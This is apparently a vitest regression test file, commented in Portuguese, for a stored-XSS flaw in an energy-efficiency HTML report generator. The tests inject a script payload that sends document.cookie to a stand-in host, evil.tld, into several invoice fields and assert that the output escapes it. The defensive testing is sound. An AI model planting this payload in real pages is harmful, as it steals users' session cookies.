import { readFileSync } from "node:fs";
import { join } from "node:path";

import { faturaNormativaSchema, type FaturaNormativa } from "@plugga/shared";
import { describe, expect, it } from "vitest";

import { montarCasoDoRelatorio } from "./caso-do-relatorio.js";
import { rodarEstudo } from "./pipeline.js";
import { gerarRelatorio } from "./relatorio-literal.js";

/**
 * VULN-1 (auditoria zero-trust): o relatório de eficiência energética é HTML
 * servido com `Content-Type: text/html` a qualquer papel com LER_ESTUDO
 * (viewer, comercial, financeiro, tech, diretoria, admin, opm). Os campos de
 * identidade da fatura (`cliente`, `apelido`, `classeDisplay`,
 * `distribuidoraDisplay`, `localidade`, `leituraAnterior/Atual`) vêm de dado de
 * negócio digitado por um usuário `comercial`/`opm` (Client.name /
 * InvoiceContext), não de constante do sistema — e o gerador
 * (`relatorio-literal.ts`) faz substituição textual literal no HTML sem
 * nenhum encoding próprio. Sem escape no ponto de entrada
 * (`caso-do-relatorio.ts`), um nome de cliente malicioso vira XSS armazenado.
 */

const REFERENCIA = join(
  __dirname,
  "../../../../../packages/auditoria-oraculo/referencia",
  "skill-estudo-eficiencia-energetica",
);
const CASOS = join(REFERENCIA, "casos");

type Json = Record<string, unknown>;

function camelizar(valor: unknown): unknown {
  if (Array.isArray(valor)) return valor.map(camelizar);
  if (valor !== null && typeof valor === "object") {
    return Object.fromEntries(
      Object.entries(valor as Json).map(([chave, filho]) => [
        chave.replace(/_([a-z])/g, (_, letra: string) => letra.toUpperCase()),
        camelizar(filho),
      ]),
    );
  }
  return valor;
}

function carregarFatura(arquivo: string): FaturaNormativa {
  const bruto = camelizar(JSON.parse(readFileSync(join(CASOS, arquivo), "utf8"))) as Json;
  const aceitos = Object.keys(faturaNormativaSchema.shape);
  return faturaNormativaSchema.parse(
    Object.fromEntries(Object.entries(bruto).filter(([chave]) => aceitos.includes(chave))),
  );
}

function carregarCaso(arquivo: string): Json {
  return JSON.parse(readFileSync(join(CASOS, arquivo), "utf8")) as Json;
}

/** Mesma montagem de `caso-do-relatorio.spec.ts`, com a fatura sobrescrevível. */
function montarComFatura(fatura: FaturaNormativa) {
  const caso = carregarCaso("caso-motor-santa-tereza.json");

  const estudo = rodarEstudo({
    funcao: "solar_bess",
    consumoPontaDesejadoKwhMes: caso.consumo_ponta_desejado_kwh_mes as number,
    nBess: caso.n_bess as number,
    capexBessTotal: caso.capex_bess_total as number,
    tusdP: caso.tusd_p as number,
    teP: caso.te_p as number,
    tusdFp: caso.tusd_fp as number,
    teFp: caso.te_fp as number,
    hspMensal: caso.hsp_mensal as number[],
    solarKwp: 0,
    capexSolarTotal: 0,
  });

  return montarCasoDoRelatorio({
    fatura,
    tarifas: {
      tusdP: caso.tusd_p as number,
      teP: caso.te_p as number,
      tusdFp: caso.tusd_fp as number,
      teFp: caso.te_fp as number,
    },
    consumoPontaDoCaso: caso.consumo_ponta_desejado_kwh_mes as number,
    fluxoBess: estudo.fluxoBess,
    fluxoSolar: estudo.fluxoSolar,
    solarKwp: estudo.solarKwp,
    capexSolarTotal: estudo.capexSolarTotal,
  });
}

const PAYLOAD = '<script>fetch("https://evil.tld/x?c="+document.cookie)</script>';

describe("VULN-1: relatório de eficiência energética escapa dado de negócio no HTML", () => {
  it("deve neutralizar <script> injetado via nome do cliente (Client.name)", () => {
    const fatura = carregarFatura("fatura-santa-tereza-2026-06_conciliada.json");
    const maliciosa: FaturaNormativa = { ...fatura, cliente: `Acme ${PAYLOAD}` };

    const caso = montarComFatura(maliciosa);
    const html = gerarRelatorio(caso);

    expect(html.toLowerCase()).not.toContain("<script>");
    expect(html).not.toContain(PAYLOAD);
    // "AGROINDUSTRIAL SERRA VERDE LTDA" -> clienteMaiusculo (toUpperCase antes de
    // escapar), então a tag injetada aparece em maiúsculas depois de escapada.
    expect(html.toLowerCase()).toContain("&lt;script&gt;");
  });

  it("deve neutralizar <script> injetado via apelido da unidade consumidora", () => {
    const fatura = carregarFatura("fatura-santa-tereza-2026-06_conciliada.json");
    const maliciosa: FaturaNormativa = { ...fatura, apelido: `Filial ${PAYLOAD}` };

    const caso = montarComFatura(maliciosa);
    const html = gerarRelatorio(caso);

    expect(html).not.toContain("<script>");
    expect(html).toContain("&lt;script&gt;");
  });

  it("deve neutralizar <script> injetado via nomeAnalise, classeDisplay, distribuidoraDisplay e localidade", () => {
    const fatura = carregarFatura("fatura-santa-tereza-2026-06_conciliada.json");
    const maliciosa: FaturaNormativa = {
      ...fatura,
      nomeAnalise: `Análise ${PAYLOAD}`,
      classeDisplay: `Comercial ${PAYLOAD}`,
      distribuidoraDisplay: `Energisa ${PAYLOAD}`,
      localidade: `Manaus/AM ${PAYLOAD}`,
    };

    const caso = montarComFatura(maliciosa);
    const html = gerarRelatorio(caso);

    expect(html).not.toContain("<script>");
    expect((html.match(/&lt;script&gt;/g) ?? []).length).toBeGreaterThanOrEqual(4);
  });

  it("deve neutralizar <script> injetado via datas de leitura (texto livre digitado na tela)", () => {
    const fatura = carregarFatura("fatura-santa-tereza-2026-06_conciliada.json");
    const maliciosa: FaturaNormativa = {
      ...fatura,
      leituraAnterior: `01/06/2026 ${PAYLOAD}`,
      leituraAtual: `30/06/2026 ${PAYLOAD}`,
    };

    const caso = montarComFatura(maliciosa);
    const html = gerarRelatorio(caso);

    expect(html).not.toContain("<script>");
  });

  it("não regride o caminho feliz: nome de cliente sem HTML continua idêntico ao golden", () => {
    // Controle negativo: um nome legítimo (sem caracteres HTML) não deve ser
    // alterado por `escapar()` — prova que a correção não introduz falso
    // positivo no relatório real.
    const fatura = carregarFatura("fatura-santa-tereza-2026-06_conciliada.json");
    const caso = montarComFatura(fatura);
    const html = gerarRelatorio(caso);

    expect(html).toContain(fatura.cliente.toUpperCase());
  });
});
